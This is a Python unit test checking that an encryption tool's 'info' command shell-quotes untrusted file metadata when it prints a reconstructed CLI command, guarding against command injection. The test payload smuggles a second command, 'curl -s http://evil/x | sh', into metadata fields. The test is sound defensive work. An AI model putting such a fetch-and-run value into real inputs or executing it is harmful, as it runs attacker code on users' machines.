#!/usr/bin/env python3
"""The `info` reconstructed-CLI block must shell-quote untrusted metadata
(gitlab#234, scan F35, CWE-78).

`_reconstruct_cli_from_metadata` builds the "Reconstructed CLI" command that
`info` prints for an untrusted file, interpolating metadata fields (pepper_name,
hsm_plugin, algorithm, cipher_chain, hkdf.info, argon2.type, randomx.mode, ...)
into shell text. A field such as pepper_name = "work; curl evil | sh #" used to
be printed verbatim, so pasting the block ran attacker code. Every interpolated
value must now be shlex-quoted: the security property is that a crafted value
comes back as exactly ONE shell token, never breaking out into extra words.
"""

import shlex
import unittest

from openssl_encrypt.modules.crypt_core import _reconstruct_cli_from_metadata

_PAYLOAD = "work; curl -s http://evil/x | sh #"


def _tokens(metadata):
    out = _reconstruct_cli_from_metadata(metadata)
    # collapse the "\\\n" line continuations into one command line
    cmd = out.replace("\\\n", " ")
    return shlex.split(cmd)


class TestReconstructedCliIsShellSafe(unittest.TestCase):
    def test_pepper_name_is_a_single_token(self):
        toks = _tokens({"encryption": {"pepper_plugin": "remote_pepper", "pepper_name": _PAYLOAD}})
        self.assertIn(_PAYLOAD, toks, "malicious pepper_name must survive as one shell token")

    def test_algorithm_is_a_single_token(self):
        toks = _tokens({"encryption": {"algorithm": _PAYLOAD}})
        self.assertIn(_PAYLOAD, toks)

    def test_cascade_chain_is_shell_safe(self):
        toks = _tokens({"encryption": {"cascade": True, "cipher_chain": ["aes-gcm", _PAYLOAD]}})
        # The joined chain must be a single token, not word-split by the ';'
        joined = f"aes-gcm,{_PAYLOAD}"
        self.assertIn(joined, toks)

    def test_hsm_plugin_is_a_single_token(self):
        toks = _tokens({"encryption": {"hsm_plugin": _PAYLOAD}})
        # hsm strips a trailing "_hsm"; the payload has none, so it passes through
        self.assertIn(_PAYLOAD, toks)

    def test_hkdf_info_is_a_single_token(self):
        toks = _tokens(
            {"derivation_config": {"kdf_config": {"hkdf": {"enabled": True, "info": _PAYLOAD}}}}
        )
        self.assertIn(_PAYLOAD, toks)

    def test_argon2_type_is_a_single_token(self):
        toks = _tokens(
            {"derivation_config": {"kdf_config": {"argon2": {"enabled": True, "type": _PAYLOAD}}}}
        )
        self.assertIn(_PAYLOAD, toks)

    def test_randomx_mode_is_a_single_token(self):
        toks = _tokens(
            {"derivation_config": {"kdf_config": {"randomx": {"enabled": True, "mode": _PAYLOAD}}}}
        )
        self.assertIn(_PAYLOAD, toks)

    def test_no_injected_shell_metacharacters_leak_as_operators(self):
        # A comprehensive check: the reconstructed command, tokenized, must never
        # contain a bare 'curl' or 'sh' operator-word from the payload.
        toks = _tokens({"encryption": {"pepper_plugin": "remote_pepper", "pepper_name": _PAYLOAD}})
        self.assertNotIn("curl", toks)
        self.assertNotIn("sh", toks)

    def test_legitimate_values_still_reconstruct_readably(self):
        out = _reconstruct_cli_from_metadata({"encryption": {"algorithm": "aes-gcm"}})
        self.assertIn("--algorithm aes-gcm", out)  # no needless quoting of a clean value


if __name__ == "__main__":
    unittest.main()
